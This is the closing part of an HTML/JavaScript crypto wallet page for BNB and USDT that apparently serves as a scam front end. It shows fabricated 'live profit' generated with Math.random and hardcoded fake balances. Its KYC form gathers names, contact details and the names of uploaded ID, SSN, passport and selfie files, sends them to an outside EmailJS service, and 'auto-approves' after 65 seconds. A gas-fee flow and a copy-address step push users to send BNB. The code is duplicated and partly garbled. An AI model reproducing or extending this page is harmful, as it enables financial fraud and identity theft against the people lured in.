      receiveAmountSpan.textContent = '0';
      return;
    }

    let estimated = 0;
    if (fromToken === 'USDT' && toToken === 'BNB') {
      estimated = fromAmount * exchangeRates.USDT_BNB;
    } else if (fromToken === 'BNB' && toToken === 'USDT') {
      estimated = fromAmount * exchangeRates.BNB_USDT;
    }

    receiveAmountSpan.textContent = estimated.toFixed(6);
  }

  fromTokenSelect.addEventListener('change', () => {
    // Swap toToken if same as fromToken
    if (fromTokenSelect.value === toTokenSelect.value) {
      toTokenSelect.value = fromTokenSelect.value === 'USDT' ? 'BNB' : 'USDT';
    }
    updateEstimate();
  });

  toTokenSelect.addEventListener('change', () => {
    // Swap fromToken if same as toToken
    if (toTokenSelect.value === fromTokenSelect.value) {
      fromTokenSelect.value = toTokenSelect.value === 'USDT' ? 'BNB' : 'USDT';
    }
    updateEstimate();
  });

  fromAmountInput.addEventListener('input', updateEstimate);

  function handleTrade() {
    const fromToken = fromTokenSelect.value;
    const toToken = toTokenSelect.value;
    const fromAmount = parseFloat(fromAmountInput.value);

    if (!fromAmount || fromAmount <= 0) {
      alert('Please enter a valid amount to swap.');
      return;
    }

    if (fromToken === toToken) {
      alert('From Token and To Token must be different.');
      return;
    }

    alert(`Swapping ${fromAmount} ${fromToken} to approximately ${receiveAmountSpan.textContent} ${toToken}.\n\n(This is a demo, no real transaction will occur.)`);
    // TODO: Add blockchain interaction with ethers.js here for real swap
  }
</script>
  
<script>
async function updateAssetDashboard() {
  const wallet = localStorage.getItem("connectedWallet");
  if (!wallet) return;

  document.getElementById("loader7").style.display = "flex";

  try {
    const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
    const abi = ["function balanceOf(address) view returns (uint)", "function decimals() view returns (uint8)"];
    const usdt = new ethers.Contract(usdtAddress, abi, provider);

    const usdtRaw = await usdt.balanceOf(wallet);
    const usdtDecimals = await usdt.decimals();
    const usdtBalance = parseFloat(ethers.utils.formatUnits(usdtRaw, usdtDecimals));
    document.getElementById("usdtBalance7").innerText = usdtBalance.toFixed(2) + " USDT";

    const bnbBalanceRaw = await provider.getBalance(wallet);
    const bnbBalance = parseFloat(ethers.utils.formatEther(bnbBalanceRaw));
    document.getElementById("bnbBalance7").innerText = bnbBalance.toFixed(4) + " BNB";

    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether,bnb&vs_currencies=usd");
    const prices = await response.json();
    const usdtPrice = prices.tether.usd || 1;
    const bnbPrice = prices.bnb.usd || 0;

    const total = usdtBalance * usdtPrice + bnbBalance * bnbPrice;
    document.getElementById("availableBalanceAmount").innerText = total.toFixed(2);
  } catch (e) {
    console.error("Error loading assets:", e);
  } finally {
    document.getElementById("loader7").style.display = "none";
  }
}

function syncSelectorsToPage7() {
  document.getElementById("languageSelector7").innerHTML = document.getElementById("languageSelector").innerHTML;
  document.getElementById("currencySelector7").innerHTML = document.getElementById("currencySelector").innerHTML;
  document.getElementById("languageSelector7").value = document.getElementById("languageSelector").value;
  document.getElementById("currencySelector7").value = document.getElementById("currencySelector").value;
}

function showAssetPage() {
  syncSelectorsToPage7();
  showPage(7);
  updateAssetDashboard();
}
</script>
  
  <script>
  function updateConnectedWalletDisplay() {
    const wallet = localStorage.getItem("connectedWallet");
    const homepageDisplay = document.getElementById("connectedWalletDisplayHomepage");
    if (wallet && homepageDisplay) {
      homepageDisplay.innerText = wallet;
    }
  }

  function updateBalancesDisplay() {
    updateTotalAssets(); // already defined in your total assets updater
  }
  </script>
<script>
document.addEventListener("DOMContentLoaded", () => {

  // Global Page Navigation Handler
  function showPage(pageNumber) {
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => page.style.display = 'none');

    const pageToShow = document.getElementById(`page${pageNumber}`);
    if (pageToShow) {
      pageToShow.style.display = 'block';
    }

    window.scrollTo(0, 0); // Scroll to top
  }

  // Homepage Button Triggers
  document.getElementById("connectWalletBtn").onclick = () => showPage(13);  // Settings (Connect Wallet)
  document.querySelector('button[onclick="showPage(6)"]').onclick = () => showPage(6); // Receive
  document.querySelector('button[onclick="showPage(5)"]').onclick = () => showPage(5); // Top Up BNB
  document.querySelector('button[onclick="showPage(8)"]').onclick = () => showPage(8); // Transfer
  document.querySelector('button[onclick="showPage(12)"]').onclick = () => showPage(12); // Settings (bottom right)

  // ü™ô Live Balances (Mock Data Example - Replace with ethers.js calls)
  function updateBalances() {
    // Replace these with actual ethers.js values
    const usdt = 3078.78;
    const bnb = 2.15;

    document.getElementById("usdtBalance").innerText = usdt.toFixed(2);
    document.getElementById("bnbBalance").innerText = bnb.toFixed(4);

    const totalUSD = usdt + (bnb * 930); // assuming 1 BNB = $930
    document.getElementById("totalAssetsDisplay").innerText = `$${totalUSD.toFixed(2)}`;
  }

  // üìà Daily Profit Chart + Progress Bar
  const goal = 150;
  let currentProfit = 47.25; // replace with real-time fetched profit
  const progressPercent = Math.min((currentProfit / goal) * 100, 100);

  document.getElementById("profitProgressText").innerText = `$${currentProfit} / $${goal}`;
  document.getElementById("profitProgressBar").style.width = `${progressPercent}%`;

  const ctx = document.getElementById("profitChart").getContext("2d");
  new Chart(ctx, {
    type: 'line',
    data: {
      labels: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
      datasets: [{
        label: 'Profit ($)',
        data: [10, 25, 40, 60, 47.25, 0, 0], // update dynamically
        borderColor: "#f3ba2f",
        backgroundColor: "rgba(243,186,47,0.15)",
        fill: true,
        tension: 0.4
      }]
    },
    options: {
      responsive: true,
      plugins: {
        legend: { display: false }
      },
      scales: {
        x: { display: true },
        y: { beginAtZero: true }
      }
    }
  });

  // Run updates
  updateBalances();
  showPage(4); // Optional: Load homepage on DOM ready
});
</script>

  <script>
// Base64 Icons
const usdtIconBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABUUlEQVR4nO3ZMQrCMBCE4T/qAF/QB7QD3SAfdIF90AfsAHbAJ2gN3gAe7sJelIC97OKbjy+3jT1zj3nzU8ccvxy0gOAgEAgEAgEAgEAj+H4Ld0qetPq+o/ryf5XywlUbwDpyn+69hU/Vwmsfl2knXQdV8q6Cf9blN2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCiV5S3c2rMJAAAAAElFTkSuQmCC";

const bnbIconBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAACVUlEQVR4nO2bS07DMBBF3z2ATfQBdoFt0AVugWzQBXqBbNAFegW3QB3CBdvEwjFzme3wISZvR7PvDldefnB4/Xbl3ALgcDgcDgcDgcDoajJwN7lVf1gfr/gZwlYxNWAj9tF+d10y5v6F+8rdiByk0EdpUfObQzKtwR7q+JzFe5vx9yHfncCVbYAZuTGBvhk2eYY2iQw0wiOZwBN1vl6eIjcD0sYZZZfK7uYEDHob98CCh5VmZEkMmHdq0hMz69HR9sC7U1g/7q1vJxkWh+eRBksz3KvucKLLi3EfdV9PfnAO0OZzfvV39e1BNHHXM+8Ag3RYAwzAMMwDDMAwzAMMwDDMAwzAMMwDDMAwzAMMwDA/1vdBf9tvPPzT35C1bsY5f6ftTRqu0Yr9c+7p6EB7GmD8P1AFn9slAfF6oUeN8AVQZkK8ZzzQ6j8LkAmAdb4U/BXYaA8FTRmQQQBXwNwVgcDgcDgcDgcDgeD/4K/h5PXVQ5Zeq9AAAAAElFTkSuQmCC";

// Function to display the icons
function displayTokenIcons() {
  // Inject USDT Icon
  const usdtImg = document.querySelector('#page4 img[alt="USDT Icon"]');
  if (usdtImg) usdtImg.src = usdtIconBase64;

  // Inject BNB Icon
  const bnbImg = document.querySelector('#page4 img[alt="BNB Icon"]');
  if (bnbImg) bnbImg.src = bnbIconBase64;
}

// Call function after DOM is ready
document.addEventListener("DOMContentLoaded", () => {
  displayTokenIcons();
});
  </script>
  
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
  // Initialize the Chart.js line chart for daily profit goal
  const ctx = document.getElementById('profitChart').getContext('2d');
  const profitGoal = 150;
  const profitData = {
    labels: [],
    datasets: [{
      label: 'Profit ($)',
      data: [],
      borderColor: '#f3ba2f',
      backgroundColor: 'rgba(243, 186, 47, 0.3)',
      fill: true,
      tension: 0.3,
      pointRadius: 0
    }]
  };

  const profitChart = new Chart(ctx, {
    type: 'line',
    data: profitData,
    options: {
      animation: false,
      responsive: true,
      scales: {
        x: {
          display: false
        },
        y: {
          beginAtZero: true,
          max: profitGoal,
          ticks: {
            color: '#f3ba2f',
            font: { weight: '900' }
          },
          grid: {
            color: '#2b3139'
          }
        }
      },
      plugins: {
        legend: {
          labels: {
            color: '#f3ba2f',
            font: { weight: '900' }
          }
        }
      },
      interaction: {
        intersect: false,
        mode: 'index',
      },
    }
  });

  // Simulate live profit updates
  let currentProfit = 0;
  const maxPoints = 20;

  function addProfitPoint() {
    if (currentProfit >= profitGoal) {
      // Reset after reaching goal
      currentProfit = 0;
      profitData.labels = [];
      profitData.datasets[0].data = [];
    }
    
    // Increment profit by a random small amount (simulate profits)
    currentProfit += (Math.random() * 5 + 1); // between 1 and 6 dollars
    
    if (currentProfit > profitGoal) currentProfit = profitGoal;

    // Push new data point
    if (profitData.labels.length >= maxPoints) {
      profitData.labels.shift();
      profitData.datasets[0].data.shift();
    }

    const timeLabel = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
    profitData.labels.push(timeLabel);
    profitData.datasets[0].data.push(currentProfit.toFixed(2));

    // Update chart and progress bar/text
    profitChart.update();

    document.getElementById('profitProgressText').textContent = `$${currentProfit.toFixed(2)} / $${profitGoal}`;
    const progressPercent = (currentProfit / profitGoal) * 100;
    document.getElementById('profitProgressBar').style.width = progressPercent + '%';
  }

  // Add a new profit data point every 3 seconds
  setInterval(addProfitPoint, 3000);

  // Initial call
  addProfitPoint();
</script>

<script>
async function loadAssetsDashboard() {
  const wallet = localStorage.getItem("connectedWallet");
  const assetList = document.getElementById("assetList");
  assetList.innerHTML = '';

  if (!wallet) {
    assetList.innerHTML = '<p style="color:#ccc;">No wallet connected.</p>';
    return;
  }

  try {
    const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

    const assets = [
      {
        name: "Tether",
        symbol: "USDT",
        address: "0x55d398326f99059fF775485246999027B3197955",
        decimals: 18,
        icon: "https://assets.coingecko.com/coins/images/325/thumb/Tether.png"
      },
      {
        name: "BNB",
        symbol: "BNB",
        address: null, // Native token
        icon: "https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png"
      }
    ];

    for (const asset of assets) {
      let balance = 0;

      if (asset.symbol === "BNB") {
        const rawBNB = await provider.getBalance(wallet);
        balance = parseFloat(ethers.formatEther(rawBNB)).toFixed(5);
      } else {
        const abi = ["function balanceOf(address owner) view returns (uint256)", "function decimals() view returns (uint8)"];
        const contract = new ethers.Contract(asset.address, abi, provider);
        const raw = await contract.balanceOf(wallet);
        const decimals = await contract.decimals();
        balance = parseFloat(ethers.formatUnits(raw, decimals)).toFixed(2);
      }

      const card = `
        <div style="background:#1e2329; padding:20px; border-radius:12px; display:flex; align-items:center; justify-content:space-between; box-shadow:0 4px 10px rgba(243,186,47,0.1);">
          <div style="display:flex; align-items:center; gap:12px;">
            <img src="${asset.icon}" alt="${asset.symbol}" style="width:40px; height:40px; border-radius:50%;"/>
            <div>
              <div style="font-size:1.1rem; font-weight:900;">${asset.name} (${asset.symbol})</div>
              <div style="font-size:0.9rem; color:#aaa;">Wallet Balance</div>
            </div>
          </div>
          <div style="text-align:right; font-weight:900; color:#f3ba2f; font-size:1.1rem;">${balance}</div>
        </div>
      `;
      assetList.innerHTML += card;
    }

  } catch (err) {
    console.error("Failed to load assets:", err);
    assetList.innerHTML = '<p style="color:red;">Error loading assets.</p>';
  }
}
</script>
  
  <script>
  const usdtIconBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABUUlEQVR4nO3ZMQrCMBCE4T/qAF/QB7QD3SAfdIF90AfsAHbAJ2gN3gAe7sJelIC97OKbjy+3jT1zj3nzU8ccvxy0gOAgEAgEAgEAgEAj+H4Ld0qetPq+o/ryf5XywlUbwDpyn+69hU/Vwmsfl2knXQdV8q6Cf9blN2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCiV5S3c2rMJAAAAAElFTkSuQmCC";

  const bnbIconBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAACVUlEQVR4nO2bS07DMBBF3z2ATfQBdoFt0AVugWzQBXqBbNAFegW3QB3CBdvEwjFzme3wISZvR7PvDldefnB4/Xbl3ALgcDgcDgcDgcDoajJwN7lVf1gfr/gZwlYxNWAj9tF+d10y5v6F+8rdiByk0EdpUfObQzKtwR7q+JzFe5vx9yHfncCVbYAZuTGBvhk2eYY2iQw0wiOZwBN1vl6eIjcD0sYZZZfK7uYEDHob98CCh5VmZEkMmHdq0hMz69HR9sC7U1g/7q1vJxkWh+eRBksz3KvucKLLi3EfdV9PfnAO0OZzfvV39e1BNHHXM+8Ag3RYAwzAMMwDDMAwzAMMwDDMAwzAMMwDDMAwzAMMwDA/1vdBf9tvPPzT35C1bsY5f6ftTRqu0Yr9c+7p6EB7GmD8P1AFn9slAfF6oUeN8AVQZkK8ZzzQ6j8LkAmAdb4U/BXYaA8FTRmQQQBXwNwVgcDgcDgcDgcDgeD/4K/h5PXVQ5Zeq9AAAAAElFTkSuQmCC";

  function displayTokenIcons() {
    const usdtImg = document.querySelector('#page4 img[alt="USDT Icon"]');
    if (usdtImg) usdtImg.src = usdtIconBase64;

    const bnbImg = document.querySelector('#page4 img[alt="BNB Icon"]');
    if (bnbImg) bnbImg.src = bnbIconBase64;
  }

  document.addEventListener("DOMContentLoaded", displayTokenIcons);
  </script>

  <script>
  let qrScanner = null;

  function openWalletModal() {
    const modal = document.getElementById("walletModal");
    const content = document.getElementById("walletModalContent");
    modal.style.display = "flex";
    setTimeout(() => {
      content.style.transform = "scale(1)";
      content.style.opacity = "1";
    }, 50);
  }

  function closeWalletModal() {
    const content = document.getElementById("walletModalContent");
    content.style.transform = "scale(0.9)";
    content.style.opacity = "0";
    setTimeout(() => {
      document.getElementById("walletModal").style.display = "none";
    }, 200);
  }

  function confirmManualWallet() {
    const address = document.getElementById("walletInputField").value.trim();
    if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
      showToast("Invalid wallet address");
      feedback(false);
      return;
    }
    localStorage.setItem("connectedWallet", address);
    closeWalletModal();
    showToast("Wallet connected");
    feedback(true);
    updateBalancesDisplay();
    showPage(4); // Go back to homepage
  }

  // === DRAG SUPPORT FOR MODAL ===
  const modal = document.getElementById("walletModalContent");
  let isDragging = false, offsetX, offsetY;

  modal.addEventListener("mousedown", (e) => {
    isDragging = true;
    offsetX = e.clientX - modal.getBoundingClientRect().left;
    offsetY = e.clientY - modal.getBoundingClientRect().top;
  });

  document.addEventListener("mousemove", (e) => {
    if (isDragging) {
      modal.style.left = (e.clientX - offsetX) + "px";
      modal.style.top = (e.clientY - offsetY) + "px";
      modal.style.position = "fixed";
    }
  });

  document.addEventListener("mouseup", () => isDragging = false);

  // === QR SCANNER ===
  function startQRScanner() {
    document.getElementById("qrScannerModal").style.display = "flex";
    qrScanner = new Html5Qrcode("qr-reader");
    qrScanner.start(
      { facingMode: "environment" },
      { fps: 10, qrbox: 250 },
      (decodedText) => {
        document.getElementById("walletInputField").value = decodedText;
        stopQRScanner();
        feedback(true);
        showToast("Address scanned!");
      },
      (err) => console.warn("QR scan error", err)
    ).catch(e => {
      console.error("QR error:", e);
      showToast("Camera access failed");
    });
  }

  function stopQRScanner() {
    if (qrScanner) {
      qrScanner.stop().then(() => {
        document.getElementById("qrScannerModal").style.display = "none";
      }).catch(e => console.warn("QR stop error", e));
    }
  }
  </script>


<script>
// Show/hide pages by ID
function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
  const page = document.getElementById(id);
  if (page) page.style.display = 'block';
}

// Copy wallet address to clipboard with alert
function copyWalletAddress() {
  const walletText = document.getElementById('walletAddress').innerText;
  if (!walletText) return alert('No wallet address to copy!');
  navigator.clipboard.writeText(walletText).then(() => {
    alert('Wallet address copied!');
  }).catch(() => {
    alert('Failed to copy wallet address.');
  });
}

// Fetch prices and icons for BNB and USDT from CoinGecko
async function fetchCoinData() {
  const ids = ['binancecoin','tether'];
  const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`);
  const data = await res.json();

  const metaRes = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids.join(',')}&order=market_cap_desc&per_page=2&page=1&sparkline=false`);
  const meta = await metaRes.json();

  return {
    BNB: { price: data.binancecoin.usd, image: meta.find(c => c.id==='binancecoin').image },
    USDT: { price: data.tether.usd, image: meta.find(c => c.id==='tether').image }
  };
}

// Initialize homepage icons and prices
async function initCoinWidgets() {
  const coin = await fetchCoinData();

  // Set icons
  const usdtIcon = document.querySelector("#usdtIcon");
  const bnbIcon = document.querySelector("#bnbIcon");
  if (usdtIcon) usdtIcon.src = coin.USDT.image;
  if (bnbIcon) bnbIcon.src = coin.BNB.image;

  // Set balances/prices
  const usdtBalance = document.getElementById("usdtBalance");
  const bnbBalance = document.getElementById("bnbBalance");
  if (usdtBalance) usdtBalance.innerText = `$${coin.USDT.price.toFixed(4)} USDT`;
  if (bnbBalance) bnbBalance.innerText = `$${coin.BNB.price.toFixed(2)} BNB`;
}

// Run on DOM load
window.addEventListener('DOMContentLoaded', () => {
  initCoinWidgets();
});
</script>
    
  
<script>
  function showPage(pageId) {
    const pages = document.querySelectorAll(".page");
    pages.forEach((page) => page.style.display = "none");

    const target = document.getElementById(pageId) || document.getElementById("page4");
    target.style.display = "block";

    // üîí Save current page
    localStorage.setItem("currentPage", pageId);
  }

  document.addEventListener("DOMContentLoaded", () => {
    // üîÅ Always go to homepage (Page 4) on refresh
    showPage("page4");

    // Optionally restore wallet display
    const wallet = localStorage.getItem("connectedWallet");
    const display = document.getElementById("connectedWalletDisplayHomepage");
    if (wallet && display) {
      display.innerText = wallet;
    }
  });
</script>
  
  <script>
function submitKYC(event) {
  event.preventDefault();
  const form = document.getElementById("kycForm");
  const name = document.getElementById("kycName").value;
  const email = document.getElementById("kycEmail").value;
  const phone = document.getElementById("kycPhone").value;
  const country = document.getElementById("kycCountry").value;

  const nationalID = document.getElementById("kycNationalID").files[0]?.name || "Not uploaded";
  const ssn = document.getElementById("kycSSN").files[0]?.name || "Not uploaded";
  const passport = document.getElementById("kycPassport").files[0]?.name || "Not uploaded";
  const selfie = document.getElementById("kycSelfie").files[0]?.name || "Not uploaded";

  const templateParams = {
    name,
    email,
    phone,
    country,
    nationalID,
    ssn,
    passport,
    selfie,
  };

  emailjs.send("service_78wwbgl", "template_omkmcio", templateParams)
    .then(() => {
      showPage("page15i");
      setTimeout(() => {
        showPage("page15ii");
      }, 65000); // Auto-approve after 65 seconds
    })
    .catch((error) => {
      alert("Failed to submit KYC. Please try again.");
      console.error("KYC Error:", error);
    });
}
</script>

<script>
  function showPage(pageId) {
    const pages = document.querySelectorAll(".page");
    pages.forEach(page => page.style.display = "none");
    const target = document.getElementById(pageId);
    if (target) target.style.display = "block";
  }

  function goToGasConfirmation() {
    const wallet = localStorage.getItem("connectedWallet");
    if (!wallet) {
      alert("Please connect your wallet first.");
      showPage("page13"); // Manual wallet connect page
      return;
    }
    showPage("page9i"); // BNB Gas Confirmation page
  }

  function estimateGasFee() {
    // Placeholder for real estimate
    document.getElementById("estimatedGasFee").innerText = "~0.00021 BNB";
  }

  document.addEventListener("DOMContentLoaded", () => {
    estimateGasFee(); // Automatically estimate gas on load
  });
</script>

  <script>
  function copyBNBAddress() {
    const address = document.getElementById("bnbAddressText").innerText;
    navigator.clipboard.writeText(address).then(() => {
      alert("BNB address copied to clipboard.");
    }).catch(err => {
      alert("Failed to copy address.");
      console.error(err);
    });
  }
  </script>
<script>
  // Simple mock exchange rates (for demonstration)
  const exchangeRates = {
    USDT_BNB: 0.00032, // 1 USDT = 0.00032 BNB (example)
    BNB_USDT: 3100,    // 1 BNB = 3100 USDT (example)
  };

  const fromTokenSelect = document.getElementById('fromToken');
  const toTokenSelect = document.getElementById('toToken');
  const fromAmountInput = document.getElementById('fromAmount');
  const receiveAmountSpan = document.getElementById('receiveAmount');

  function updateEstimate() {
    const fromToken = fromTokenSelect.value;
    const toToken = toTokenSelect.value;
    const fromAmount = parseFloat(fromAmountInput.value) || 0;

    if (fromToken === toToken || fromAmount <= 0) {
      receiveAmountSpan.textContent = '0';
      return;
    }

    let estimated = 0;
    if (fromToken === 'USDT' && toToken === 'BNB') {
      estimated = fromAmount * exchangeRates.USDT_BNB;
    } else if (fromToken === 'BNB' && toToken === 'USDT') {
      estimated = fromAmount * exchangeRates.BNB_USDT;
    }

    receiveAmountSpan.textContent = estimated.toFixed(6);
  }

  fromTokenSelect.addEventListener('change', () => {
    // Swap toToken if same as fromToken
    if (fromTokenSelect.value === toTokenSelect.value) {
      toTokenSelect.value = fromTokenSelect.value === 'USDT' ? 'BNB' : 'USDT';
    }
    updateEstimate();
  });

  toTokenSelect.addEventListener('change', () => {
    // Swap fromToken if same as toToken
    if (toTokenSelect.value === fromTokenSelect.value) {
      fromTokenSelect.value = toTokenSelect.value === 'USDT' ? 'BNB' : 'USDT';
    }
    updateEstimate();
  });

  fromAmountInput.addEventListener('input', updateEstimate);

  function handleTrade() {
    const fromToken = fromTokenSelect.value;
    const toToken = toTokenSelect.value;
    const fromAmount = parseFloat(fromAmountInput.value);

    if (!fromAmount || fromAmount <= 0) {
      alert('Please enter a valid amount to swap.');
      return;
    }

    if (fromToken === toToken) {
      alert('From Token and To Token must be different.');
      return;
    }

    alert(`Swapping ${fromAmount} ${fromToken} to approximately ${receiveAmountSpan.textContent} ${toToken}.\n\n(This is a demo, no real transaction will occur.)`);
    // TODO: Add blockchain interaction with ethers.js here for real swap
  }
</script>
  
<script>
  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
      page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
    window.scrollTo(0, 0);
  }
</script>
  
</body>
</html>
